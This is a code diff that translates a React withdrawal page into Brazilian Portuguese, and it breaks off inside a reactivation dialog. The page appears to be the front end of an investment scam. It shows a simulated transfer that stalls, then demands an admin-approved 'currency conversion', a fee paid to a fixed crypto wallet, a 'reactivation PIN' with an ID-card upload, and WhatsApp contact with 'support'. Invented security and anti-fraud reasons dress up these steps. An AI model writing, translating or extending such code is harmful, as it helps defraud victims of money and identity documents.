@@ -84,7 +84,7 @@ const Withdraw = () => {
   const localCurrency = userLocalCountry?.currency || user?.currency || 'USD';
   const localCurrencySymbol =
     userLocalCountry?.symbol || getCurrencySymbol(user?.currency) || '$';
-  const localCountryName = userLocalCountry?.name || user?.country || 'your country';
+  const localCountryName = userLocalCountry?.name || user?.country || 'seu país';
   const localCountryFlag = userLocalCountry?.flag || '🌍';
 
   useEffect(() => {
@@ -93,7 +93,7 @@ const Withdraw = () => {
         const response = await API.get('/kyc/status');
         if (response.data.success) setKycStatus(response.data.data.status);
       } catch (error) {
-        console.error('KYC status check error:', error);
+        console.error('Erro ao verificar status do KYC:', error);
         setKycStatus('error');
       }
     };
@@ -106,20 +106,20 @@ const Withdraw = () => {
         const wallet = await walletService.getWallet();
         setWalletBalance(wallet?.balance || 0);
       } catch (error) {
-        console.error('Failed to fetch wallet:', error);
+        console.error('Falha ao buscar carteira:', error);
       }
     };
     fetchData();
   }, []);
 
-  // Cleanup on unmount
+  // Limpeza ao desmontar
   useEffect(() => {
     return () => {
       if (progressInterval.current) clearInterval(progressInterval.current);
     };
   }, []);
 
-  // ─── Progress effect (single gate transition at a time) ───
+  // ─── Efeito do progresso (uma transição por vez) ───
   useEffect(() => {
     if (!showTransferModal) {
       if (progressInterval.current) {
@@ -169,7 +169,7 @@ const Withdraw = () => {
         progressInterval.current = null;
         setTransferProgress(100);
         setTransferStatus('complete');
-        toast.success('Withdrawal completed successfully!');
+        toast.success('Saque concluído com sucesso!');
         return;
       }
 
@@ -202,41 +202,41 @@ const Withdraw = () => {
 
   const pixKeyTypes = [
     { id: 'cpf',    label: 'CPF/CNPJ' },
-    { id: 'email',  label: 'Email' },
-    { id: 'phone',  label: 'Phone' },
-    { id: 'random', label: 'Random Key' },
+    { id: 'email',  label: 'E-mail' },
+    { id: 'phone',  label: 'Telefone' },
+    { id: 'random', label: 'Chave Aleatória' },
   ];
 
   const isPix = crypto === 'PIX';
-  const addressLabel = isPix ? 'PIX Key' : 'Wallet Address';
+  const addressLabel = isPix ? 'Chave PIX' : 'Endereço da Carteira';
   const addressPlaceholder = isPix
     ? pixKeyType === 'cpf'
-      ? '000.000.000-00 or 00.000.000/0000-00'
+      ? '000.000.000-00 ou 00.000.000/0000-00'
       : pixKeyType === 'email'
-      ? 'you@email.com'
+      ? 'seu@email.com'
       : pixKeyType === 'phone'
       ? '+55 11 99999-9999'
-      : 'Random key (EVP)'
-    : 'Enter your wallet address';
+      : 'Chave aleatória (EVP)'
+    : 'Digite o endereço da sua carteira';
 
   const handleSubmit = (e) => {
     e.preventDefault();
     const amountNum = parseFloat(amount);
 
     if (!amount || isNaN(amountNum) || amountNum < 1) {
-      toast.error('Please enter a valid amount');
+      toast.error('Digite um valor válido');
       return;
     }
     if (kycStatus !== 'verified') {
-      toast.error('KYC verification required. Please complete your KYC to withdraw.');
+      toast.error('Verificação KYC necessária. Complete seu KYC para sacar.');
       return;
     }
     if (amountNum > walletBalance) {
-      toast.error('Insufficient balance');
+      toast.error('Saldo insuficiente');
       return;
     }
     if (!address) {
-      toast.error(isPix ? 'Please enter your PIX key' : 'Please enter a wallet address');
+      toast.error(isPix ? 'Digite sua chave PIX' : 'Digite um endereço de carteira');
       return;
     }
     if (amountNum > WITHDRAWAL_LIMIT) {
@@ -259,7 +259,7 @@ const Withdraw = () => {
       await new Promise((resolve) => setTimeout(resolve, 800));
       setShowTransferModal(true);
     } catch (error) {
-      toast.error(error?.response?.data?.message || 'Withdrawal failed');
+      toast.error(error?.response?.data?.message || 'Falha no saque');
     } finally {
       setLoading(false);
     }
@@ -279,11 +279,11 @@ const Withdraw = () => {
     if (!file) return;
     const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
     if (!validTypes.includes(file.type)) {
-      toast.error('Invalid file format. Use JPG, PNG or PDF.');
+      toast.error('Formato de arquivo inválido. Use JPG, PNG ou PDF.');
       return;
     }
     if (file.size > 5 * 1024 * 1024) {
-      toast.error('File must be at most 5MB.');
+      toast.error('O arquivo deve ter no máximo 5MB.');
       return;
     }
     setIdCardFile(file);
@@ -297,12 +297,12 @@ const Withdraw = () => {
 
   const handleVerifyPin = () => {
     if (!idCardFile) {
-      setIdError('Please upload your ID card.');
+      setIdError('Por favor, envie seu documento de identidade.');
       return;
     }
     setIdError('');
     if (!reactivationPin.trim()) {
-      setPinError('Please enter the reactivation PIN.');
+      setPinError('Por favor, insira o PIN de reativação.');
       return;
     }
 
@@ -320,9 +320,9 @@ const Withdraw = () => {
         setTransferStatus('pending');
         setTransferProgress(45);
         setShowTransferModal(true);
-        toast.success('Account reactivated. Completing transfer...');
+        toast.success('Conta reativada. Concluindo transferência...');
       } else {
-        setPinError('Invalid PIN. Please try again.');
+        setPinError('PIN inválido. Tente novamente.');
         setReactivationPin('');
         setIsVerifyingPin(false);
       }
@@ -337,7 +337,7 @@ const Withdraw = () => {
 
   const handleFeeConfirmed = () => {
     if (!PROCESSING_FEE_PAID) {
-      toast.error('Fee not yet confirmed by admin. Please contact support.');
+      toast.error('Taxa ainda não confirmada pelo administrador. Entre em contato com o suporte.');
       return;
     }
     setProcessingFeeConfirmed(true);
@@ -349,7 +349,7 @@ const Withdraw = () => {
   const handleCopyFeeWallet = () => {
     navigator.clipboard.writeText(PROCESSING_FEE_WALLET_ADDRESS);
     setFeeCopied(true);
-    toast.success('Wallet address copied!');
+    toast.success('Endereço da carteira copiado!');
     setTimeout(() => setFeeCopied(false), 2000);
   };
 
@@ -367,20 +367,20 @@ const Withdraw = () => {
 
   const handleCancelFeeStep = () => {
     resetFlow();
-    toast.error('Withdrawal cancelled.');
+    toast.error('Saque cancelado.');
   };
 
   const handleCancelAdmin = () => {
     resetFlow();
-    toast.error('Withdrawal cancelled.');
+    toast.error('Saque cancelado.');
   };
 
   const whatsappConversionLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-    `Hello Support,\n\nI need currency conversion approval for my withdrawal.\n\nAmount: $${parseFloat(amount || 0).toLocaleString()}\nCountry: ${localCountryName}\nCurrency: ${localCurrency} (${localCurrencySymbol})\n\nPlease convert my balance and confirm.`
+    `Olá Suporte,\n\nPreciso da aprovação para conversão de moeda do meu saque.\n\nValor: $${parseFloat(amount || 0).toLocaleString()}\nPaís: ${localCountryName}\nMoeda: ${localCurrency} (${localCurrencySymbol})\n\nPor favor, convertam meu saldo e confirmem.`
   )}`;
 
   const whatsappFeeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-    `Hello Support,\n\nI have sent the $${PROCESSING_FEE_AMOUNT} processing fee for my withdrawal.\n\n— Details —\nWithdrawal Amount: $${parseFloat(amount || 0).toLocaleString()}\nMethod: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\nFee Wallet: ${PROCESSING_FEE_WALLET_LABEL}\nFee Address: ${PROCESSING_FEE_WALLET_ADDRESS}\n\nPlease verify my payment and unlock the withdrawal. Thank you.`
+    `Olá Suporte,\n\nEnviei a taxa de processamento de $${PROCESSING_FEE_AMOUNT} referente ao meu saque.\n\n— Detalhes —\nValor do Saque: $${parseFloat(amount || 0).toLocaleString()}\nMétodo: ${isPix ? `PIX (${pixKeyType.toUpperCase()})` : crypto}\nCarteira da Taxa: ${PROCESSING_FEE_WALLET_LABEL}\nEndereço da Taxa: ${PROCESSING_FEE_WALLET_ADDRESS}\n\nPor favor, verifiquem meu pagamento e liberem o saque. Obrigado.`
   )}`;
 
   const finalizeWithdrawal = async () => {
@@ -392,8 +392,8 @@ const Withdraw = () => {
         amount: amountNum,
         currency: 'USD',
         description: isPix
-          ? `Withdrawal via PIX (${pixKeyType})`
-          : `Withdrawal to ${crypto} wallet`,
+          ? `Saque via PIX (${pixKeyType})`
+          : `Saque para carteira ${crypto}`,
         metadata: isPix
           ? { method: 'pix', pixKeyType, pixKey: address }
           : { method: 'crypto', cryptoCurrency: crypto, walletAddress: address },
@@ -411,14 +411,14 @@ const Withdraw = () => {
         status: 'pending',
       });
     } catch (error) {
-      console.error('Finalize withdrawal error:', error);
+      console.error('Erro ao finalizar saque:', error);
     }
   };
 
   const handleCloseSuccess = async () => {
     setShowTransferModal(false);
     await finalizeWithdrawal();
-    toast.success('Withdrawal request submitted!');
+    toast.success('Solicitação de saque enviada!');
     navigate('/transactions');
   };
 
@@ -427,7 +427,7 @@ const Withdraw = () => {
   const amountNum = parseFloat(amount) || 0;
 
   const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-    `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
+    `Olá, gostaria de aumentar meu limite de saque. Minha solicitação atual de $${amountNum.toLocaleString()} excede o limite de $${WITHDRAWAL_LIMIT.toLocaleString()}.`
   )}`;
 
   return (
@@ -435,8 +435,8 @@ const Withdraw = () => {
       <Navbar />
       <div className="p-4 sm:p-6 max-w-2xl mx-auto">
         <div className="mb-6">
-          <h1 className="text-2xl sm:text-3xl font-bold text-white">Withdraw Funds</h1>
-          <p className="text-slate-400 mt-1">Withdraw your earnings</p>
+          <h1 className="text-2xl sm:text-3xl font-bold text-white">Sacar Fundos</h1>
+          <p className="text-slate-400 mt-1">Saque seus ganhos</p>
         </div>
 
         <motion.div
@@ -446,7 +446,7 @@ const Withdraw = () => {
         >
           <div className="bg-slate-900 rounded-lg p-4 mb-6">
             <div className="flex justify-between items-center">
-              <span className="text-slate-400">Available Balance</span>
+              <span className="text-slate-400">Saldo Disponível</span>
               <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
             </div>
           </div>
@@ -454,8 +454,8 @@ const Withdraw = () => {
           <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
             <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
             <p className="text-blue-400 text-sm">
-              Your withdrawal limit is{' '}
-              <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
+              Seu limite de saque é de{' '}
+              <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> por solicitação.
             </p>
           </div>
 
@@ -464,8 +464,8 @@ const Withdraw = () => {
               <FaLock className="text-yellow-500 text-sm" />
               <p className="text-yellow-400 text-sm">
                 {kycStatus === 'pending'
-                  ? 'Your KYC is pending approval. Please wait for verification.'
-                  : 'KYC verification required to withdraw. Please complete your KYC first.'}
+                  ? 'Seu KYC está pendente de aprovação. Aguarde a verificação.'
+                  : 'Verificação KYC necessária para sacar. Complete seu KYC primeiro.'}
               </p>
             </div>
           )}
@@ -473,7 +473,7 @@ const Withdraw = () => {
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
               <label className="block text-slate-300 text-sm font-medium mb-2">
-                Select Withdrawal Method
+                Selecione o Método de Saque
               </label>
               <div className="grid grid-cols-3 sm:grid-cols-6 gap-2">
                 {paymentMethods.map((c) => (
@@ -498,14 +498,14 @@ const Withdraw = () => {
               {isPix && (
                 <p className="text-teal-400 text-xs mt-2 flex items-center gap-1">
                   <FaQrcode className="text-teal-400" />
-                  PIX — instant Brazilian payment. Withdrawal sent in BRL.
+                  PIX — pagamento instantâneo brasileiro. Saque enviado em BRL.
                 </p>
               )}
             </div>
 
             {isPix && (
               <div>
-                <label className="block text-slate-300 text-sm font-medium mb-2">PIX Key Type</label>
+                <label className="block text-slate-300 text-sm font-medium mb-2">Tipo de Chave PIX</label>
                 <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                   {pixKeyTypes.map((t) => (
                     <button
@@ -527,7 +527,7 @@ const Withdraw = () => {
 
             <div>
               <label className="block text-slate-300 text-sm font-medium mb-2">
-                Amount ({user?.currency || 'USD'})
+                Valor ({user?.currency || 'USD'})
               </label>
               <div className="relative">
                 <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
@@ -537,7 +537,7 @@ const Withdraw = () => {
                   type="number"
                   value={amount}
                   onChange={(e) => setAmount(e.target.value)}
-                  placeholder="Enter amount"
+                  placeholder="Digite o valor"
                   min="1"
                   step="0.01"
                   className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
@@ -545,14 +545,14 @@ const Withdraw = () => {
               </div>
               {amountNum > WITHDRAWAL_LIMIT && (
                 <p className="text-red-400 text-xs mt-1">
-                  Amount exceeds your withdrawal limit of {formatCurrency(WITHDRAWAL_LIMIT)}.
+                  O valor excede seu limite de saque de {formatCurrency(WITHDRAWAL_LIMIT)}.
                 </p>
               )}
               {amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
                 <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
                   <FaShieldAlt className="text-amber-400" />
-                  Amounts above {formatCurrency(TRACE_THRESHOLD)} require security verification
-                  and a ${PROCESSING_FEE_AMOUNT} processing fee.
+                  Valores acima de {formatCurrency(TRACE_THRESHOLD)} exigem verificação de segurança
+                  e uma taxa de processamento de ${PROCESSING_FEE_AMOUNT}.
                 </p>
               )}
             </div>
@@ -568,7 +568,7 @@ const Withdraw = () => {
               />
               {isPix && (
                 <p className="text-slate-500 text-xs mt-1">
-                  Double-check your PIX key — transfers cannot be reversed.
+                  Confira sua chave PIX — transferências não podem ser revertidas.
                 </p>
               )}
             </div>
@@ -582,7 +582,7 @@ const Withdraw = () => {
                 <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
               ) : (
                 <>
-                  <FaArrowDown className="text-sm" /> Request Withdrawal
+                  <FaArrowDown className="text-sm" /> Solicitar Saque
                 </>
               )}
             </button>
@@ -590,7 +590,7 @@ const Withdraw = () => {
         </motion.div>
       </div>
 
-      {/* ═══════════ UPGRADE LIMIT MODAL (no AnimatePresence) ═══════════ */}
+      {/* ═══════════ MODAL DE UPGRADE DE LIMITE ═══════════ */}
       {showUpgradeModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
           <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md">
@@ -599,15 +599,15 @@ const Withdraw = () => {
                 <FaArrowUp className="w-8 h-8 text-orange-500" />
               </div>
             </div>
-            <h3 className="text-xl font-bold text-white text-center mb-2">Withdrawal Limit Exceeded</h3>
+            <h3 className="text-xl font-bold text-white text-center mb-2">Limite de Saque Excedido</h3>
             <p className="text-sm text-slate-400 text-center mb-4">
-              Your withdrawal request of <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
-              exceeds your current limit of <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
+              Sua solicitação de saque de <strong className="text-white">{formatCurrency(amountNum)}</strong>{' '}
+              excede seu limite atual de <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
             </p>
             <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
               <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
               <p className="text-orange-300 text-xs leading-relaxed">
-                To upgrade your withdrawal limit, please contact our support team.
+                Para aumentar seu limite de saque, entre em contato com nossa equipe de suporte.
               </p>
             </div>
             <div className="flex gap-3">
@@ -615,7 +615,7 @@ const Withdraw = () => {
                 onClick={() => setShowUpgradeModal(false)}
                 className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
               >
-                Cancel
+                Cancelar
               </button>
               <a
                 href={whatsappUpgradeLink}
@@ -623,18 +623,18 @@ const Withdraw = () => {
                 rel="noopener noreferrer"
                 className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
               >
-                <FaWhatsapp className="text-lg" /> Contact Support
+                <FaWhatsapp className="text-lg" /> Falar com Suporte
               </a>
             </div>
             <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
               <FaHeadset className="text-slate-500" />
-              <span>Support is available 24/7</span>
+              <span>Suporte disponível 24/7</span>
             </div>
           </div>
         </div>
       )}
 
-      {/* ═══════════ TRANSFER SIMULATION MODAL ═══════════ */}
+      {/* ═══════════ MODAL DE SIMULAÇÃO DE TRANSFERÊNCIA ═══════════ */}
       {showTransferModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
           <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md text-center">
@@ -657,17 +657,17 @@ const Withdraw = () => {
             </div>
 
             <h3 className="text-xl font-bold text-white mb-2">
-              {transferStatus === 'pending' && 'Processing Transfer...'}
-              {transferStatus === 'failed' && 'Transfer Failed'}
-              {transferStatus === 'complete' && 'Transfer Complete!'}
+              {transferStatus === 'pending' && 'Processando Transferência...'}
+              {transferStatus === 'failed' && 'Falha na Transferência'}
+              {transferStatus === 'complete' && 'Transferência Concluída!'}
             </h3>
 
             <p className="text-sm text-slate-400 mb-4">
               {transferStatus === 'pending' &&
-                `Moving funds from broker wallet to your ${isPix ? 'PIX account' : 'destination wallet'}.`}
+                `Movendo fundos da carteira do corretor para sua ${isPix ? 'conta PIX' : 'carteira de destino'}.`}
               {transferStatus === 'failed' &&
-                'The transfer could not be completed. Please try again.'}
-              {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
+                'A transferência não pôde ser concluída. Por favor, tente novamente.'}
+              {transferStatus === 'complete' && 'Seus fundos foram enviados com sucesso!'}
             </p>
 
             <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
@@ -689,7 +689,7 @@ const Withdraw = () => {
                 onClick={handleRetry}
                 className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
               >
-                Try Again
+                Tentar Novamente
               </button>
             )}
 
@@ -698,14 +698,14 @@ const Withdraw = () => {
                 onClick={handleCloseSuccess}
                 className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
               >
-                Done
+                Concluir
               </button>
             )}
           </div>
         </div>
       )}
 
-      {/* ═══════════ GATE 1: CURRENCY CONVERSION MODAL ═══════════ */}
+      {/* ═══════════ PORTÃO 1: MODAL DE CONVERSÃO DE MOEDA ═══════════ */}
       {showAdminSupportModal && (
         <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
           <div className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
@@ -716,27 +716,27 @@ const Withdraw = () => {
             </div>
 
             <h3 className="text-xl font-bold text-white text-center mb-2">
-              Balance Conversion Required
+              Conversão de Saldo Obrigatória
             </h3>
 
             <p className="text-sm text-slate-400 text-center mb-5">
-              To protect your funds and prevent fraud, this withdrawal{' '}
-              <strong className="text-red-400">cannot be completed</strong> until your balance
-              has been converted into your local currency.
+              Para proteger seus fundos e prevenir fraudes, este saque{' '}
+              <strong className="text-red-400">não pode ser concluído</strong> até que seu saldo
+              tenha sido convertido para sua moeda local.
             </p>
 
             <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
               <div className="flex items-start gap-3">
                 <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
                 <div className="text-red-300 text-xs leading-relaxed space-y-2">
-                  <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Mandatory Step</p>
+                  <p className="font-bold text-red-200 text-sm uppercase tracking-wide">Etapa Obrigatória</p>
                   <p>
-                    Your balance <strong className="text-white">must</strong> be converted to{' '}
+                    Seu saldo <strong className="text-white">precisa</strong> ser convertido para{' '}
                     <strong className="text-white">{localCurrency} ({localCurrencySymbol})</strong>{' '}
-                    — the official currency of <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
+                    — a moeda oficial de <strong className="text-white">{localCountryFlag} {localCountryName}</strong>.
                   </p>
                   <p>
-                    This allows us to <strong className="text-white">track and monitor</strong> the transaction route end-to-end.
+                    Isso nos permite <strong className="text-white">rastrear e monitorar</strong> a rota da transação de ponta a ponta.
                   </p>
                 </div>
               </div>
@@ -744,23 +744,23 @@ const Withdraw = () => {
 
             <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
               <div className="flex justify-between">
-                <span className="text-slate-400">Withdrawal Amount:</span>
+                <span className="text-slate-400">Valor do Saque:</span>
                 <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
               </div>
               <div className="flex justify-between">
-                <span className="text-slate-400">Target Currency:</span>
+                <span className="text-slate-400">Moeda de Destino:</span>
                 <span className="text-white font-semibold">{localCurrencySymbol} {localCurrency}</span>
               </div>
               <div className="flex justify-between">
                 <span className="text-slate-400">Status:</span>
-                <span className="text-amber-400 font-semibold">93% — Awaiting Admin Approval</span>
+                <span className="text-amber-400 font-semibold">93% — Aguardando Aprovação do Admin</span>
               </div>
             </div>
 
             <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
               <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
               <p className="text-yellow-300 text-xs leading-relaxed">
-                <strong className="text-yellow-200">Only an administrator</strong> can perform this conversion. Contact support, then click "Conversion Complete" once approved.
+                <strong className="text-yellow-200">Somente um administrador</strong> pode realizar esta conversão. Contate o suporte e depois clique em "Conversão Completa" após aprovação.
               </p>
             </div>
 
@@ -771,31 +771,31 @@ const Withdraw = () => {
                 rel="noopener noreferrer"
                 className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
               >
-                <FaWhatsapp className="text-lg" /> Contact Admin (Currency Conversion)
+                <FaWhatsapp className="text-lg" /> Contatar Admin (Conversão de Moeda)
               </a>
               <button
                 onClick={handleConversionComplete}
                 className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
               >
-                <FaCheckCircle /> Conversion Complete → Continue
+                <FaCheckCircle /> Conversão Completa → Continuar
               </button>
               <button
                 onClick={handleCancelAdmin}
                 className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
               >
-                Cancel Withdrawal
+                Cancelar Saque
               </button>
             </div>
 
             <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
               <FaComments className="text-slate-500" />
-              <span>Support is available 24/7</span>
+              <span>Suporte disponível 24/7</span>
             </div>
           </div>
         </div>
       )}
 
-      {/* ═══════════ GATE 2: PROCESSING FEE MODAL ═══════════ */}
+      {/* ═══════════ PORTÃO 2: MODAL DE TAXA DE PROCESSAMENTO ═══════════ */}
       {showProcessingFeeModal && (
         <div className="fixed inset-0 z-[60] flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
           <div className="bg-slate-800 border border-amber-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto">
@@ -806,23 +806,23 @@ const Withdraw = () => {
             </div>
 
             <h3 className="text-xl font-bold text-white text-center mb-2">
-              Processing Fee Required
+              Taxa de Processamento Necessária
             </h3>
 
             <p className="text-sm text-slate-400 text-center mb-5">
-              A one-time processing fee of{' '}
-              <strong className="text-amber-400">${PROCESSING_FEE_AMOUNT}.00</strong> is required
-              to finalize this high-value withdrawal.
+              Uma taxa única de processamento de{' '}
+              <strong className="text-amber-400">${PROCESSING_FEE_AMOUNT}.00</strong> é necessária
+              para finalizar este saque de alto valor.
             </p>
 
             <div className="mb-4 p-4 bg-amber-500/10 border-2 border-amber-500/40 rounded-lg text-center">
-              <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">Processing Fee</p>
+              <p className="text-xs text-amber-300 uppercase tracking-wider font-semibold mb-1">Taxa de Processamento</p>
               <p className="text-3xl font-bold text-white">${PROCESSING_FEE_AMOUNT}.00</p>
             </div>
 
             <div className="mb-4">
               <label className="block text-slate-300 text-sm font-medium mb-2">
-                Payment Address ({PROCESSING_FEE_WALLET_LABEL})
+                Endereço de Pagamento ({PROCESSING_FEE_WALLET_LABEL})
               </label>
               <div className="flex items-center gap-2">
                 <code className="flex-1 bg-slate-900 border border-slate-700 rounded-lg px-3 py-3 text-xs text-white break-all font-mono">
@@ -832,7 +832,7 @@ const Withdraw = () => {
                   type="button"
                   onClick={handleCopyFeeWallet}
                   className="p-3 bg-slate-700 rounded-lg hover:bg-slate-600 transition flex-shrink-0"
-                  title="Copy address"
+                  title="Copiar endereço"
                 >
                   {feeCopied ? <FaCheck className="text-green-400" /> : <FaCopy className="text-white" />}
                 </button>
@@ -843,12 +843,12 @@ const Withdraw = () => {
               <div className="flex items-start gap-3">
                 <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
                 <div className="text-blue-300 text-xs leading-relaxed">
-                  <p className="font-semibold text-blue-200 mb-1">Why is this required?</p>
+                  <p className="font-semibold text-blue-200 mb-1">Por que isso é necessário?</p>
                   <ul className="list-disc pl-4 space-y-1">
-                    <li>Additional security verification for high-value transfers</li>
-                    <li>Blockchain & network processing costs</li>
-                    <li>Compliance and anti-fraud monitoring</li>
-                    <li>Currency conversion execution</li>
+                    <li>Verificação de segurança adicional para transferências de alto valor</li>
+                    <li>Custos de processamento de blockchain e rede</li>
+                    <li>Conformidade e monitoramento antifraude</li>
+                    <li>Execução da conversão de moeda</li>
                   </ul>
                 </div>
               </div>
@@ -856,17 +856,17 @@ const Withdraw = () => {
 
             <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
               <div className="flex justify-between">
-                <span className="text-slate-400">Withdrawal Amount:</span>
+                <span className="text-slate-400">Valor do Saque:</span>
                 <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
               </div>
               <div className="flex justify-between">
-                <span className="text-slate-400">Processing Fee:</span>
+                <span className="text-slate-400">Taxa de Processamento:</span>
                 <span className="text-amber-400 font-semibold">${PROCESSING_FEE_AMOUNT}.00</span>
               </div>
               <div className="flex justify-between">
                 <span className="text-slate-400">Status:</span>
                 <span className={PROCESSING_FEE_PAID ? 'text-green-400 font-semibold' : 'text-amber-400 font-semibold'}>
-                  {PROCESSING_FEE_PAID ? 'Fee Confirmed ✓' : 'Awaiting Admin Confirmation'}
+                  {PROCESSING_FEE_PAID ? 'Taxa Confirmada ✓' : 'Aguardando Confirmação do Admin'}
                 </span>
               </div>
             </div>
@@ -875,15 +875,15 @@ const Withdraw = () => {
               <div className="mb-4 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
                 <FaLock className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-yellow-300 text-xs leading-relaxed">
-                  <strong className="text-yellow-200">Awaiting admin confirmation.</strong>{' '}
-                  Send the fee to the address above, then contact support.
+                  <strong className="text-yellow-200">Aguardando confirmação do administrador.</strong>{' '}
+                  Envie a taxa para o endereço acima e entre em contato com o suporte.
                 </p>
               </div>
             ) : (
               <div className="mb-4 p-3 bg-green-500/10 border border-green-500/30 rounded-lg flex items-start gap-3">
                 <FaCheckCircle className="text-green-500 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-green-300 text-xs leading-relaxed">
-                  <strong className="text-green-200">Fee confirmed!</strong> You may now proceed with your withdrawal.
+                  <strong className="text-green-200">Taxa confirmada!</strong> Você pode prosseguir com seu saque.
                 </p>
               </div>
             )}
@@ -900,9 +900,9 @@ const Withdraw = () => {
                 }`}
               >
                 {PROCESSING_FEE_PAID ? (
-                  <><FaCheckCircle /> I Have Paid — Proceed</>
+                  <><FaCheckCircle /> Já Paguei — Prosseguir</>
                 ) : (
-                  <><FaLock /> Waiting for Admin Confirmation</>
+                  <><FaLock /> Aguardando Confirmação do Admin</>
                 )}
               </button>
 
@@ -912,7 +912,7 @@ const Withdraw = () => {
                 rel="noopener noreferrer"
                 className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
               >
-                <FaWhatsapp className="text-lg" /> Notify Support / Send Proof
+                <FaWhatsapp className="text-lg" /> Notificar Suporte / Enviar Comprovante
               </a>
 
               <button
@@ -920,19 +920,19 @@ const Withdraw = () => {
                 onClick={handleCancelFeeStep}
                 className="w-full py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
               >
-                Cancel Withdrawal
+                Cancelar Saque
               </button>
             </div>
 
             <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
               <FaComments className="text-slate-500" />
-              <span>Support is available 24/7 — reply within minutes</span>
+              <span>Suporte disponível 24/7 — resposta em minutos</span>
             </div>
           </div>
         </div>
       )}
 
-      {/* ═══════════ REACTIVATION MODAL ═══════════ */}
+      {/* ═══════════ MODAL DE REATIVAÇÃO ═══════════ */}
       {showReactivationModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4">
           <div className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md max-h-[90vh] overflow-y-auto">
@@ -942,25 +942,25 @@ const Withdraw = () => {
               </div>
             </div>
             <h3 className="text-xl font-bold text-white text-center mb-2">
-              Account Reactivation Required
+              Reativação de Conta Necessária
             </h3>
             <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
               <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
               <p className="text-orange-300 text-xs leading-relaxed">
